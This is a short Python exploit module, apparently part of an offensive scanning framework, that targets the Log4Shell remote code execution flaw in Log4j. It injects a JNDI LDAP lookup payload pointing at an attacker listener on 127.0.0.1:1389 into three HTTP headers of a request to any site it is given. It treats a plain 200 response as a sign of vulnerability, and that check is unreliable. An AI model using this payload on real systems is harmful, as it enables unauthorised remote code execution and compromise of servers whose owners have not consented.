import requests
from core.printmodels import *

class Log4j_RCE_Exploit:
    def __init__(self):
        self.name = "Log4j RCE"
        self.description = "Log4j Remote Code Execution (Log4Shell)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                "User-Agent": "${jndi:ldap://127.0.0.1:1389/a}",
                "X-Api-Version": "${jndi:ldap://127.0.0.1:1389/a}",
                "Referer": "${jndi:ldap://127.0.0.1:1389/a}"
            }
            
            response = requests.get(site, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                return PrintSuccess(f"[Log4j] Site might be vulnerable! Check your LDAP listener")
            return PrintFailed("[Log4j] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Log4j] Error: {str(e)}")
